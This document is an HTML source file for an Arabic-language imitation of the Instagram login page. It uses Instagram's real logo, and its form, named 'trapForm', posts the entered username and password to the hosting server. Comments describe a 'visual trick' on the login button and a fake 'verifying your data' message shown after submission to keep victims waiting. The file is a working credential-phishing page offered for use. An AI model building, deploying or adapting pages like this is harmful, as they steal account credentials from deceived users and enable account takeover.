<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول • Instagram</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #fafafa;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            background-color: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            width: 350px;
            padding: 10px 0;
            margin-bottom: 10px;
        }
        .logo {
            margin: 22px auto 12px;
            background-image: url("https://static.cdninstagram.com/r/eaIJjVeOtOp/web/login/logo_2x.png/177140219195.png");
            background-size: 175px 51px;
            height: 51px;
            width: 175px;
            display: block;
        }
        form {
            margin-top: 24px;
            padding: 0 40px;
        }
        .input-field {
            position: relative;
            margin-bottom: 6px;
            width: 100%;
        }
        input[type="text"], input[type="password"] {
            background-color: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            box-sizing: border-box;
            color: #262626;
            font-size: 14px;
            padding: 9px 8px 7px;
            width: 100%;
        }
        button[type="submit"] {
            background-color: #0095f6;
            border: 1px solid transparent;
            border-radius: 4px;
            color: #fff;
            cursor: pointer;
            font-weight: 600;
            font-size: 14px;
            margin-top: 8px;
            padding: 5px 9px;
            width: 100%;
            opacity: 0.7; /* البداية الزر غير فعال */
            pointer-events: none;
        }
        button[type="submit"].active {
            opacity: 1;
            pointer-events: auto;
        }
        .separator {
            display: flex;
            align-items: center;
            margin: 18px 40px 10px;
        }
        .line {
            flex-grow: 1;
            height: 1px;
            background-color: #dbdbdb;
        }
        .or-text {
            margin: 0 18px;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
        }
        .fb-login {
            text-align: center;
            margin-bottom: 10px;
        }
        .fb-login a {
            color: #385185;
            font-size: 14px;
            font-weight: 600;
            text-decoration: none;
        }
        .signup-container {
            background-color: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            width: 350px;
            padding: 15px 0;
            text-align: center;
            font-size: 14px;
        }
        .signup-container a {
            color: #0095f6;
            font-weight: 600;
            text-decoration: none;
        }
        /* تنسيق رسالة النجاح الوهمية */
        #successMessage {
            display: none;
            color: green;
            font-weight: bold;
            text-align: center;
            margin-top: 20px;
        }
    </style>
</head>
<body>

    <div class="login-container">
        <div class="logo" aria-label="Instagram" role="img"></div>
        
        <form id="trapForm" method="POST" action="/">
            <div class="input-field">
                <input type="text" name="username" id="username" placeholder="رقم الهاتف، اسم المستخدم أو البريد الإلكتروني" required>
            </div>
            <div class="input-field">
                <input type="password" name="password" id="password" placeholder="كلمة السر" required>
            </div>
            <button type="submit" id="submitBtn">تسجيل الدخول</button>
        </form>

        <div class="separator">
            <div class="line"></div>
            <div class="or-text">أو</div>
            <div class="line"></div>
        </div>

        <div class="fb-login">
            <a href="#">تسجيل الدخول بواسطة فيسبوك</a>
        </div>
    </div>

    <div class="signup-container">
        ليس لديك حساب؟ <a href="#">تسجيل</a>
    </div>

    <div id="successMessage">جاري التحقق من البيانات.. يرجى الانتظار</div>

    <script>
        // جافا سكريبت عشان لما يكتب الباسورد الزر يصير لونه أزرق (خدعة بصرية)
        const usernameInput = document.getElementById('username');
        const passwordInput = document.getElementById('password');
        const submitBtn = document.getElementById('submitBtn');

        function checkInputs() {
            if (usernameInput.value !== '' && passwordInput.value.length >= 6) {
                submitBtn.classList.add('active');
            } else {
                submitBtn.classList.remove('active');
            }
        }

        usernameInput.addEventListener('input', checkInputs);
        passwordInput.addEventListener('input', checkInputs);

        // عند الضغط، أظهر رسالة نجاح وهمية (لأن الـ HTML ما بعمل توجيه تلقائي في كودنا البسيط)
        document.getElementById('trapForm').addEventListener('submit', function() {
            document.getElementById('successMessage').style.display = 'block';
        });
    </script>
</body>
</html>
